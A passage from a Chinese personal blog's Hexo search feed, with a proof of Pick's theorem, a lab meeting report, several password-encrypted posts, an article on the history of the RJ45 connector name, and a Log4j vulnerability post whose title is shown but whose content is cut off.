inline">\(bi_{R}+{\frac{b_{R}}{2}}-1\)</span></li></ul><p><span class="math display">\[\begin{aligned}&amp;=(m-2)(n-2)+(m+n)-2-1 \\&amp;=mn-(m+n)+1 \\&amp;=(m-1)(n-1)\end{aligned}\]</span></p><h5 id="直角三角形">直角三角形</h5><p>易见两条邻边和对角线组成的两个直角三角形全等，且 <span class="math inline">\(i\)</span> , <span class="math inline">\(b\)</span> 相等。设其斜边上有 <span class="math inline">\(c\)</span> 个格点。</p><ul><li><p><span class="math inline">\(b=m+n+c-3\)</span></p></li><li><p><span class="math inline">\(i={\frac{(m-2)(n-2)-c+2}{2}}\)</span></p></li></ul><p><span class="math display">\[\begin{aligned}&amp;~~~~~~i+{\frac {b}{2}}-1 \\&amp;={\frac {(m-2)(n-2)-c+2}{2}}+{\frac {m+n+c-3}{2}}-1 \\&amp;={\frac {(m-2)(n-2)}{2}}+{\frac {m+n-3}{2}} \\&amp;={\frac {(m-1)(n-1)}{2}}\end{aligned}\]</span></p><h5 id="一般三角形">一般三角形</h5><p>逆运用前面对 <span class="math inline">\(2\)</span> 个多边形的证明：既然矩形符合皮克定理，直角三角形符合皮克定理。又前面证明到若 <span class="math inline">\(P\)</span> ， <span class="math inline">\(T\)</span> 符合皮克公式，则 <span class="math inline">\(P\)</span>加上 <span class="math inline">\(T\)</span> 的 <span class="math inline">\(PT\)</span> 亦符合皮克公式。那么由于矩形可以分解成 <span class="math inline">\(1\)</span>个任意三角形和<strong>至多</strong> <span class="math inline">\(3\)</span> 个直角三角形。于是显然有，只有当这个任意三角形也符合皮克定理的时候，才会使得在直角三角形符合的同时，矩形也符合。</p><h3 id="定理提出者">定理提出者</h3><p><strong>Georg Alexander Pick</strong><sup>†</sup> (1859.8.10 –1942.7.26)</p><p><img src="https://googles.plus/images/loading.gif" data-original="\images\GeorgPick.png"></p><p>乔治·亚历山大·皮克（Georg AlexanderPick）是一位奥地利数学家。生于约瑟法·施莱辛格（JosefaSchleisinger）和阿道夫·约瑟夫·皮克（Adolf JosefPick）的犹太家庭。他在特雷津（Theresienstadt）集中营中不幸去世。</p>]]></content>
      
      
      <categories>
          
          <category> 数学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1995年 · 大连 · 人民广场</title>
      <link href="/2021/12/20/1995-nian-de-da-lian-ren-min-guang-chang/"/>
      <url>/2021/12/20/1995-nian-de-da-lian-ren-min-guang-chang/</url>
      
        <content type="html"><![CDATA[<iframe src="//player.bilibili.com/player.html?aid=333658200&amp;bvid=BV1xw411f74J&amp;cid=354428732&amp;page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="width: 780px;height: 560px;"></iframe><figure><img src="https://googles.plus/images/loading.gif" data-original="/images/大連市政府前の広場.avif" alt="大連市政府前の広場"><figcaption aria-hidden="true">大連市政府前の広場</figcaption></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 记忆 </tag>
            
            <tag> 大连 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021/12/12 · NSILAB · 周会报告</title>
      <link href="/2021/12/11/2021-12-12-nsilab-zhou-hui-bao-gao/"/>
      <url>/2021/12/11/2021-12-12-nsilab-zhou-hui-bao-gao/</url>
      
        <content type="html"><![CDATA[<h1 id="nsilab-sfc9982-周会报告">2021/12/12 ·NSILAB<br>sfc9982<br>周会报告</h1><hr><h2 id="machine-learning">Machine Learning</h2><hr><h2 id="关于寒假的一些规划">关于寒假的一些规划</h2><ul><li>知网/<strong>IEEE Explore</strong> 关键词搜索</li><li>看论文（ML/CV/车流/边缘计算）</li><li>伪代码（比开源项目的一大坨易读）</li><li>维基学习法，刷维基百科，看词条，不断点开看定义，直到点到头。<strong>(Abilityto Re-Presentaion)</strong></li><li>带着萌生的idea继续研究</li></ul><hr><p>Thanks for Listening</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2021/12/12 · NSILAB · 周会报告 · cxy</title>
      <link href="/2021/12/11/my-baka/"/>
      <url>/2021/12/11/my-baka/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码认证失败，请检查权限" data-whm="密码验证失败，请检查散列">  <script id="hbeData" type="hbeData" data-hmacdigest="c67d4f6fc45bac42d5992e351219e891dd7746259bece95aa74fff9571fd9437">7ba49fc020c4dd7e4705649b240f6aa47c55757edac58082a32d51ff24e0ec783496061b6061f3ad177d12370ba7794d5cad078f496354339da36976d1a0c431afa3a1c2e394db238efb71815e051cb73b481435ca297efcdb85abc14091aac41116c9c1cf7537243428eeb2b18205b6774e7a85b94c82f3ce700549190c4c91051d86161942c8a6254b63bd69ae54391ea66a834f8ba24136e9181da0c1fbea35026360eb06ec3b0502178c7c496d84ccf7322a70cdbde5e0f9d6b21a2063ec364334e143d0ee792bc04d158b65a17aa27f3d1254931be31d8f8ffbc2ae1b6e9743338e93f9883b8646b89c20a82c42e7a10ad9a0f89a50a307c5e456cb0cbccac61f14673b5b4cf61a13fe374d830b2294df2eca31a85ac09df39665ac7e7b55731380955b3be6a33e0706eea31cab3e19e9660a09a617024ca277de9409917a2650772f6d9f790b98c241be03e371747a53f4c9c00d1e3395445cc0bcbd20dc6748fa500e4436da6db1aba621dcca41603d95fd7c142ccaf46dfb160950b7ec94acb9c1e34391a89e0ebe5279fdeae4920bc7a1e617eb6d72b776afedf44bdc8de6bb8fa2b6841c8a58c7f28ff391919db04e376a51dfd7d66234a6d46532b35c5c082538c25925bc4b6cb6376baf4582db0251d064b5a9d65d460d9c58ab397cb1eef1c0b37b84cf139538e2d93115a20b4514ba7243ab7b017cb2c344c729d8fceda9dd84065b650dc60d7e40c0c31e8a579cec3b3f70f5f22052fcd82fec1483bc39a84079d56888904f34bd78076b22966489a59ef949222a258329071b5f9c0bd85eef3294ff0581e8063faef59855d46ec4a0c92dade2b7da299fdd38e03b06f77579d07fb4199ead31b0aa9da1a5cbc20a2313fc8788f45f7274cc721cd1bbd913673f6afa7578e08a0e5c255bfb361d5ea205dd3e2ea2ea378d9d254172c68f1ca6de1b4c20f6ac987c50d38b4c333937927d88371e7932c8690c9114e76c762c6cafd244892f932dbc099c5aa910e734aa3ac7c0fa83095f281e9e404afa81adfa5e603c3695c6d2cb80ca937ae19bebe7d6bd734eb81e075acd1f84c351f1fed2f2f73d93414742cd382e27f9aeaca9c5d6f6a19a11f433443ff70a210eda40e304a9cdaf2bb0aa69aa6b4fa29cbd198a5417725606c2f6aedb7ebef58e93ae42cb7640d6fe8fb1a28c54bfabf439974b5ed01fe2da281615022376aa8b628450bf2d4d515581ff362870139bb8f2acfe639baf3dc931d1fbfe799c40460715a25fd3eb1f74277915612ecd9901344ed9933d6b06cdf22a5b5a896e66eb28395cfe199f4ee4dea1e3265de0f304a9e06d21aba029f3a2e9478d146b6400582c5ca75498ac57e904f8992d0262e73da8b2a26b081e027128d9ec3cd16208130242ec81f74057dc96fdb8d2d88806d49ebd9bb5f52d499bfbdc2aab6321dea019d489cd90401b92b28d680810a2a8c3f16151bb83070773484a34fbd1b53f929e413c56e1c7c0849b75db2cf2da8d6c21255cb8b6b8dc4f491a668ad449aec058a1e550d32c3d1f55d8c97450593257c029ec9ddcc7878aa360653c382051a6f4c7b51a4e0aa2f7c4fb3c6cd87feb078b17aaf4e995b1423238467298ce0e5c69196c1c675f8e97cc4b92147775f5d3de4e117c1fc2281f6082a06fef41622bc78d53e38535001cd0c7743f7f7a24caafdbe2e93e01979e783f0bbe8ffc9f730bc22b6b4eef68db719f6a31303bc414109e70ec74d3d418f0e3ab01cb180cc774bb96a3a6c1e6d035f4ab</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-flip">      <input class="hbe hbe-input-field hbe-input-field-flip" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-flip" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-flip" data-content="Hey, password is required here.">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【英语作业】Presentation about Gen-Z in Shopping</title>
      <link href="/2021/12/11/presentation-about-gen-z-in-shopping/"/>
      <url>/2021/12/11/presentation-about-gen-z-in-shopping/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码认证失败，请检查权限" data-whm="密码验证失败，请检查散列">  <script id="hbeData" type="hbeData" data-hmacdigest="2aaa39d016fa236599753a63336822d422e3b95ce554ef51ba63039ed4629bdb">922d1af033b710dfc77546f1c43cc112d0f9287de20a72e0c5b1206122db33fcb55192a2e2fe79e129ed0e58256e49ad6677ce3d5e92ae4394b3d9e1af786bd33ce37b1214021734a13ebf8a3cae5e88e193e990033a043ab31d35883e363089d99ad84e6e13ac2c7928a3f58bbed8bb9a00d95a79e9298ba1d80a29dd44095bffd7d7eaf304b065a1477db11eaf7b88939c2c7cf801745fe57e34cdb74d7193f514b9b150c0c5aa60c13ecd6b52f8cfa6cf359e1697b5473b9fbd2c4b6eb59601d2233766bf92cf4347a9d85b3ea112fa7c045346f6d212bc345f245759c9559eb9e48b745e2d036911bcbfb0db378dea02b2dd839238690e2d1396f28966edc19dd0014ace33b400492ac2c2d55964b517a2fdcda4503f3f947ae3fdb7000bccd984790c1ae0204f483345418288e2aa2acbc1eb0c34d8e6162f182839b9d32e437177447622d0385cb02005f986ec672aa94cbf29b026134f5c9a11eb734552df396cdd876565b058c943f2c12dd7669731ee4dbe35340ee7c7b77c8b2813d33fcda0c72d6e1f5980e7e1b80c18359380d6411a470a17385b8eac5f5cfb21d1da85422de2490ca9f366af49df7cfe98e85620e6d17cbf223b6c01261e4acd8bd1162803acaf5bb5a2b060d348bb3dea2da22cfa089e92fa47750240ad372eb1f157acb26bd7b62059542ca7391398c98828d29a139bf751126e10ac0a11d60c6b5163461e3967e7439ded929d846b0120da895b17b2c8481a5c91e4fd407eca5250948e314b6dc20a8d63d0cb5c737e0c2eec1768c4d69c7b28a547bd44b62e3f3f76e21aad24d1d8605e9648fb7fd0d10daef7aa3ca7dafb2afdde282280e10444dccd8d11634b9db3454da0b366d793410331adb5095bd39404da057363919b07edff5a7f253b6e9e5114a965a68b28e6ccc14b42c71a3b92056c4e42e2d39118aec950bc9d9831577e09c60da6c90c2cf950eb14742ecc0fc021ad18e56f1d60f9876cf3088a55a4edc304d81ff354573c1599ca9572488af900adb60b18615525d3a683e3fd56b5125e6bf40bcf9de9544078687a3dedf2e5ae5a066cda869da19af91bf0c12a61e0003af92fd20434a6284df391b120c5e356a411327e06d51426e78ccc8883e341a3f6524f02cc76462bacdd1efd36ad322d279ab13b40bbbb52673261cacf8357aa11ea248336e9259179992882d923171e4edc4b60041b2b0fdabeacb5bd880069085eece86221ae92f582269039475f184e861df3203c42a2b3fbecaf4be77c54f9b193966d567fa35de42b950d06b8f11a3db0d64fd191d4a24c1afa97ad179215c0fce52ae553e7cd9f50ff8b4382e8c800b74b76b32ff016a90ceef14a12bd208fe9b9c292b47c80e7dbed89f651dede61ff7597816ebfd392859a89191f7371536f6cd256289bed0fc1c48ea475ceb71cbf6973ddd83f10519eaa2e849a338092e71e6c02a09adcff4571fe1b3ed8c6b992832d437e311d84189ddfb7616ec613d90877b44d0df83f978c7282ea2ad5dd6e8a19a22865cd7413f5adc18f4941c92b6ce7c5c6eab77f665667d212f4c30978488117a84e7161804c9bc3499aa013d3604d55a9800d1950c3da823a054f85a04936df2e3df329792fec81361558b6f91d5479b0ffaf459a6751bf513b7d0fc3ac0434f250a8c130d0369582bbf97c673e637fe2ce87898b6dde25cd6b01b01bb6688786f8976520952a5340f29eef07042cf50232dc99e99ba3f72e814dbe8a42328a43707ceace4c979cea4178eafe73dbb20907a98f7db7224e1b9caf5391aaeb7626d0b32eca2618da05f1ce17514099c345dfa58370e18a4bdbfd6510e76cd6143537c64ba70f047ebace820207e3c36756d86d4ddc4a35b04ab61c1933451e773abcefcff607426eca3851f0f40cf70b54e5ffadab83de91985d11b71d8ee0dc44559d17a194426a73e0eaafbc013b9291b20d6934a075ccea241298b842c74dee8093d0d8317440112e695eb59c1546575773ddecd00041993f186e670a3f74e6ac26b217f72516f30a779de4ed7d51e206d887da7a0755cb4f261384623a07aa951372fed6aeda29a1b7d87e79922b079efce05dfc34f4ce31b19da3c62de3bbe45e0286cc87c9031e289e2df7a9d13c0593a9b69d3a9b3710d212e5a463bf9a0ba28d0c89bc67ef4ac3654b7a349125549040f002ed0ff4763ef46df26ac8cf329522548b2552f986641a52f92f40600335466c6e39d805d9b0a3d92acf9f22c9b12ad9cb26bd678233a3b41845815a53c796ecb13fe42f7fcbf3cddf2df84f5db9cdc95f5cbea842a317c6e7692f5880a66465670951c09d85fbb35f7881a5cdce690cc671c9a12a5e7190f3bcafbc848745264b36dbb76fa926603751aaba9f98e2f225d0b14c0038bc4592c40e2f2159e3046c6a8bb10e33e1bde2b2d0540706b727fa91db1445fd046be33aab07814438e27b61e44d7203472b62ba354cae20d74900c0a17dd60c027a75bdea28183c1305b2721d71a33527b7cd70bd4725ce2ce7a7d7832e606ae878844a1f03fa74adfb3671721e33ae36c73be9594bb01dc43121f39c8f6e2f569d6419dc1b58ea4078adce6d563eb7779a521145991a9c908160d373c1e46180cbd449e2db5512aada120d49704c6f8539fea691f7b2d128dc99e0379881925863844e2798fc3a8570a94f770dca7f252ed48309cdf66b2de1f3a5b4f350b64353babf54e0b82d7e02fbfc447afa6c0b9f410edf581c68b1729fa60b134d7dfb650360c805aba333aa6417b2664d4018e3f3bb7d6601a9a875dc88bb2923d6c6a8d99a2e6a9f26a801e4b4dea1c1fe49c956a39a742e0246a55bc02189199b1e4212a1dc7365cf2bbeb3dbe641414b06f14a98711d1c620a104a5a5813112c77d69af4a738ffd3db82b4014bf4eef3ab06eba4e3feca44043b08f09e66b081dae5409c4dcc2161926bf59036565f872058b157df7057bea21f03c18e6e1c8982cdcf3c3cf69385b1c6896c0ccc420a9a4e30b65384738c459835fe6a6ad0ac7893ce0580c71e8b679ca084542b910867403266612097db3db5466c76b166a969ba5415a73095ab54eac0a0690e81480a38cdcbfb0001c2c79262c34b0c69ca963434e06eea5aede5d1b52bdb0be2627d90abd641745c5abb47b0221eb2b20d8fbe5b88808c3c259969c88f50187e670c2c</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-flip">      <input class="hbe hbe-input-field hbe-input-field-flip" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-flip" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-flip" data-content="Hey, password is required here.">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> English </tag>
            
            <tag> 外语学习 </tag>
            
            <tag> CET </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RJ45的历史：将错就错</title>
      <link href="/2021/12/10/rj45-de-li-shi-jiang-cuo-jiu-cuo/"/>
      <url>/2021/12/10/rj45-de-li-shi-jiang-cuo-jiu-cuo/</url>
      
        <content type="html"><![CDATA[<p>业内经常用术语“RJ45”表示模块式8槽8触点(8P8C)接口，该接口部署用于通过双绞线铜缆实现的以太网，虽然这种说法基本上是张冠李戴。</p><span id="more"></span><p>但既然RJ45这个名称已经延续了下来，我想我们也许应该仔细了解一下这种命名法的历史，以及为什么时至今日它仍然是双绞线以太网应用的事实标准。</p><h3 id="万事通">万事通</h3><p>RJ45中的“RJ”是“RegisteredJack”的意思，即“注册插座”，是一个标准名称，起源于20世纪70年代BellSystem公司用于电话接口的通用服务订购代码(USOC)方案。您可能熟悉的老式电话RJ是RJ11。RJ11使用6槽2触点(6P2C)接口，用于一路电话服务，我们大多数人就是在它的陪伴下长大的。如果您从事电话领域，您可能也非常熟悉RJ14和RJ25，分别使用6P4C(4触点)和6P6C (6触点)用于两路和三路服务。</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://www.flukenetworks.com.cn/sites/default/files/blog/rj-45.png"></p><p>虽然RJ命名法在技术上只与插座的接线(也就是槽位的数量及连接线的数量)有关，但名称常用于指实际的模块式连接器类型，而不关心接线。这就产生了非常严重的混淆。</p><p>例如，尽管RJ11在技术上是单线对连接，因为其2触点状态，但RJ14和RJ25使用相同的6槽位模块式连接器，并且除触点数量不同外，三者在物理上完全相同。这就造成这些连接器全部被称为RJ11连接器，虽然从技术上讲，RJ14和RJ25并不属于RJ11。</p><p><img src="https://googles.plus/images/loading.gif" data-original="https://www.flukenetworks.com.cn/sites/default/files/blog/8p8c-ethernet-and-key-connector.png"></p><p>这与我们现在将8P8C双绞线以太网连接器称为RJ45是一样的。早期采用8P8C接线的连接器是带耳的RJ45，用于连接电话领域的双中继线。当电话行业开始在这些连接器上传输数据时，RJ45的名称就延续了下来。</p><p>但是，真正的带耳RJ45并不完全兼容我们现在使用的8P8C双绞线以太网连接器。8P8C插头能够插入到真正的RJ45插座，但真正的RJ45插头不能插入到8P8C以太网插座(当然，除非您裁掉小塑料耳朵)。</p><h3 id="黑猫白猫">黑猫白猫</h3><p>既然原始的带耳RJ45几乎用不到，并且我们中的大多数人将永远不会遇到这些电话连接器，那么我们把术语RJ45用于表示双绞线以太网连接器并不是什么大问题。毕竟，这是我们所有人都知道的术语。</p><p>RJ45不仅仅是一个术语。RJ45接口(或模块式8P8C接口，如果您现在决定保证技术上正确)也是双绞线以太网布线事实上的接口，因为这是众所周知的接口，支持后向兼容性和互操作性。</p><p>这就是为什么布线系统已经从3类线（CAT 3）发展到了5类线（CAT5e），又发展到6类线（CAT6）和超6类线（CAT6A），却仍然继续部署RJ45的原因；也正是TIA在最新的8类线（CAT8）布线中采用无处不在的RJ45的原因。正因如此，您的DSXCableAnalyzer系列测试仪非常容易处理所有布线系统，无论是5类、6类、超6类还是8类线。</p><blockquote><p>Reference:</p><p>https://www.flukenetworks.com.cn/blog/cabling-chronicles/history-rj45-case-mistaken-identity</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 网络 </tag>
            
            <tag> 硬件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【英语作业】Energy Conservation and Emission Reduction</title>
      <link href="/2021/12/10/ying-yu-zuo-ye-energy-conservation-and-emission-reduction/"/>
      <url>/2021/12/10/ying-yu-zuo-ye-energy-conservation-and-emission-reduction/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码认证失败，请检查权限" data-whm="密码验证失败，请检查散列">  <script id="hbeData" type="hbeData" data-hmacdigest="56eed95982082f46f2e00627e13197645242b13b44cb91c50a0f0f59a2def24a">922d1af033b710dfc77546f1c43cc112d7a930a0897362d57d6aa7ee2d663636176b9c107936e4233ee837555ac0155a852d623e1689a5a38a171685657e3e8d19b2dfbf80b7cd0444664cef1fa28476f70e65993315b14f75f38318b11d0af06ebd320e37ea1c6d231fd905c33ae69db8fd75f4317c8d91e567441e310193f96fb06a990d334277fe6f2efb73a2ebad0502bd1a3fcf767b668e34f6509cf41bdfb85edf644bf9c8e5b3f7bde25f3142276bd7cc7e379fb45dcf255543cfafb13889e4cc2b2da6834218a3bc1fd45ace843a200ec7bc3c69eb53a52c69be11997437aee6a69c1bcd4d6ccf9a871f8e56249cb92f072d847e6f379c8f0131bb348dea0627c62df3c4c5d8ff73f20bdf3ef16480cf72375a9a0f9afd290a89c0ffdbe7397f0fba2f8dca1578f1e6d89feb004372b8d3865d1b8271821c148d6ae50d3aa11238319ad6d3eb8a3698e59eda5c98ec7c5aef85551a94a5ac0f200be506e0e093082428f7d8b2dd027cdbd8deab612da2bf5ab1bcfd300470ffe8d0e12105d1f05fc5597624ea063fc7962ce5d750d6fff4264021dc8de121059b85902d8f8d8d0be832457fd95fa97d8aa28afe1371f9995e2d901d4dc84e54728ab75a74c346539123c37adb16ca490af16969bafabc081976530699d2753bbaf251f8381487b824df5a80e526242619014f8498b731d2e18d05694c8ffc78e3cff070dbd5ce0d4326ad9aaeec8a11f39826962224c539fcbd82f4610b949984d17c6a3c39dae7fc94e277d86ef6e1c335f154873b65483da94f5bf3e7ed680528187935c602e340fc84a4cb575bf76c792c859a50e71ce08ab4feda98fdcafce50ce3088fa6e02d2db8d5c1113628803dec17a9c1f9f7157d09615e18459b79c649142b98f35d72c2cf228953fc931184516b39f6d6b1a98272ca1c1d2bc64a2fc1a9f0a05ea5ad2ae7a00ea180e92de2b5c5d1c0460d5bba814aaf66b5987102a33c6af6c3919d03c2181a737948540c7078b96fe7791be9d8a0776ef914ee4a7dbb1d346dbaf4454cc801f99ab9fd3d64ed256e186d4d2ab57af20fe0306757fcfed12793ee860f60dcfe2551944a2bc1f10ddd34016aeea15ec42c92e00bb5457e6f4379c1bb0a685dd5befbd123eaef6800d9e93a29ac1dcb2e4314270e6ee278789cf6e2cf7f22d58e63ef016df2434ca9addc47902c15d471107eb3d7fe998d050c291cb1df27e1b97ab3f16ef3bc7a8c9be44c9a6460154ac32a03fada3edb1aa32ed52d904b149795ca9d4c04f1234f6eb343073dc06decdcddba05592ae3c13840efba2907e76d4c1c025a86d7943925a95f5d840a45c474f1bacd65c63945298af6c3ff166b81b8d54bf682742bd0f161e900d772762f02acb563c8d0daeb82886d807aec20a41c4076a2784f9be9efacb56e6cc43c19047251a2c760c4f56ff320bd0923f143fdf3c2f9ad6df6a6536b695f373e93db8a3c2b475fbf2d11da45d1471a92accc9b0386719704a5e048cbf72fd8416e97837c765cbb898fa28f55f9fcc7b505d9f68c935167644a570003aa1b885d4eb810a05db7cc955e496c892c9b61a330200ac4c779c970de0652b6f7c31550913be902da9783b3d84eb7f735e138ff8a05b4e540da00bbcc0e292f863f11d7d55b367a2c2f9ea671e7df8db1d893a5c111a7da052f8b32fe33b598d1b75925842f90740c90870e7c6857d6222b12b636c129885eda8e30d8e1b2e4cf339e93a3ad2c00cea87b20b33c1f3af00063d17eb66bf571fab89479fcec68098c59b18992003b8e72505b67f3882c0e103e50fab7bdc1dbb6e814d34f5ae0a3a1b8d34425e3eb88d8de2e1b849aed034f621e51c2f318756bd0a136b505a39ec77028f38465b3d76ecae63b2cf69db5e3d9a690472d0a88c91f30c79e78de03c71a6c0320aff8ff9e722f69ff544363b70319dce21a126f5c74eb6e7ea7acf1e671668655b3f5804001cfad963f385519895e30f3ef5ae3da7309637411a34cf5bbe8fdeda6852c5ff71090055cefa8198ccf937733efb05359280ba332765581ced2f2c245a2e5ff96ffe8b8e86cd892381698dc0bfef587dce8eb0c5366fe60497c514a5c11261b2295f23fa45a7b4356b30a04c689422b1dbae03133b2873e8fc6f8fdca2e4dd9035152d748128b451848df9ed16a80ad0235c16f700af4352ddf0774edf205a86433a577fdb28e33f56e5bb7dd467ed368f61ef80915a2e7fef9e0af98d316c0ce49fa711b0d6c0a1ac4ba7376ebfb496eb4371af401f30be6f1a515dade431694223781500ade0090c4a96dd7bcb113fda21e681135c39614e13e4eade3dac2022bdaebb965a03c314d0a4e977530da9c0d941bcda96a4d55bcd706a48ed4c31087053732aba359e51cd71eb7ce96b0fef7e762bfc614e113747084fef4596bfdb1e67298175bb6792ebf86c71f847718719dd3d03c8b793590ee7a29224d5fb9c8dbd747848a9c9f39a938097ba18fc46e558adbf9df5a9a22bc3c61811d6bd065372ae99d6fd24833a2066e25d1f16f756c592cf74b775a9ee32e413b687cd6c6bca07fd99b5c785e089a13cada133826ce6d4d5e4cb5d0825cb5d46a3c0ec42692d9c614e54a9369e52224eff3fde8c28ff2b5b8ea35a61e37976c8799f84e50482b29c15c2a8a4de44ce1cdacd19616c0c9471980ac80612ec8571a13c3f59eeed42414a0f3a42506616195bb52f66bb47b5a05d42dcd5005b91f56abcf113b804310743854b114f03c5d53cdd962b8e44c06e8317591af8862e8f6334534b770c5f146ee4ea611de96c7a34f61fba00e9c6404df924186d1ba2bc8c60b3a76dc5561e72440e6888f8a5bd863f9b2ebc57d0d0cf006f3b02d987b8571afa9fd69faa91ba68e10088408ce846d27c080f8473090ba1761c5b3a0331999c4b3f692a64609872181c252d34b87d0a8ed79bc680f364b0cb53ce5ed76a31bb5bfa7b21bed9c7b5e1ea7c03c41efce309a669f0c3c1da2189705d03787bda25f7af43bda9a1d43b2c96ef089ee2a04d92e5ed2caea63b81c409a09517d05cd7f85ccc34c39d873835c27f7a20ec4c2da0684395e5b92333ece9ba23be5fe35e655081110da74247f36bc5c858471f151c1dd6703faf65b364b2e805afd130ea9dbcc89d2aa1b42f941ca94d4e3a6ba35b9a466ae44e05b551b7e0ea613b17901f602f1a52a42b3f293d4402c71fc21056568f98c63ddc18120da69a7c46934e25a72a1a73efcb19dc31e30aa3be222b0d2bd694e2be37d3aed29e2290ab2ae6c0b9c2b92b1c7303187762c602417df5913392022c5d3773bb4f9b32d0f4e6ef03b17bbed9f224c9976f1eb8bbe0d4a89baa0525db4c7edac2253ae2a13035cba92ff135f214ca480a4f15a8a94cebc16cb19e91824d439f8091b3fffe1acc3298ca3cbb1f8e2c6aeabce0ebf6a373869d912086b8d8bad6d85f7067c565e41f6c11130dc0b153665521bb4e623397119879f1c2cef5ff143b487cc900b52e507f2eaecb694bd5b304978bf3cf2a951c16b74a4963e49dce1c9983bba3d9db14d222e611495bfade9e77474335b31cf3542db71b0993a6752d2cfcbfca87249fe2e5c07c862e1559564b9e4837b7534f3444706b47a96d5349004f1819e58589cfe5b2ce264a3568ddff0771008afd8f3cbab7710b49dc3fc02a436d25eb2496abff7323a904b08472ecfb6af467578849b6fd40871dcb25e619d74ec5d478c6affb9b14f15b180d00c897e1528c127dee4e2128d2e2c681a670cf7e65a6b188f4e5d9599b92f5d53564dc232e136d3845c9c31468acd0a62cc39ddc42aff111a8299df8be8c6de390962765f3b2f54e4904ca2d8dad9e2304787b005ef4a1b5f83b89deb717fc97a3b07b59dd22e1b1e13d7d15925758e7c764ef62ccbdf76fddda316ec3676ff51b7afbadf65ee7e838f512882c5f08a66c2af83b26cea5a2f3a98f58aeb05572a32d78439848728f86133d75ead8f9e875d53da7f42e469fd35de4a068461b477915b1a88c64a73550e5c92b90027374dc6640845f543ca3347c842607190517660c7485636c7bf2742eda80e368f3cdece1a9185de208eabfba35e05659164250875f49ce8ebadef8aa9e051020a697e8841bc50de3ca63d931122dcd978a3f10c46245bb329bc3e0ad5ab24a6944c1a256770d366567f7c086e5ca3deae68048e8c7c8d88385dda24ac5e9c0945c92425bb3cd1f98cf6cac879546037374f10f6eeeb2f7597fd0ede24fee25d5b90f360bfc18a349386144bb4d43d249f6086aaf0faba97755a8b1ecac42712548ed5931cc652ab1ae1a8d537a6216a146342f7d30a8af317d6198587b6464381adc011d143741878853cafafe85ca5f97e7ecf2945b95ff829ce07659ec2818db8615d6603d02329b4489add1ddd27848bec7564ea05686ed0e45d8d79c38381617472dfbf90a3e38964efe100ef12aaa461844b6c2ee670642ddb68f361d53fac44b7de860d54b57097cc17d183c7eb5ff996297aaf31fa0a54af4a80cd6783ac78a1b21626322c31e66a3c16ccced9f69bdac344c8aa53365197686ee5eb5080bf1cbb6ec65ecdd310c53bc771c3f4ecc69ff5ac7c959d84a0745b15151910715b2c1605c69ee431569f8efc85754ad765db7379baa50aafa82af36765c0eafa2e3cd442f433abe40b69738394ae24795f333dfb20ead70d947e1ecf4a000b01adb4fc79dc96a425b0000720668d80e3a881442a95f7d93b65fedb9e7ce271c3d5add2081a132bcfabc08b591677199ceaf647855d9c8620463a302fcefe5d3691b7160a391d7767a05cb4ac640883150c50a662bfa53d258788af0d5c3ae633eb645491dba3d215e8a5a3492ac7d7db7d533c28acb303e6292381</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-flip">      <input class="hbe hbe-input-field hbe-input-field-flip" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-flip" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-flip" data-content="Hey, password is required here.">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> English </tag>
            
            <tag> 外语学习 </tag>
            
            <tag> CET </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Log4j 远程代码执行漏洞</title>
      <link href="/2021/12/10/apache-log4j-yuan-cheng-dai-ma-zhi-xing-lou-dong/"/>
      <url>/2021/12/10/apache-log4j-yuan-cheng-dai-ma-zhi-xing-lou-dong/</url>
      
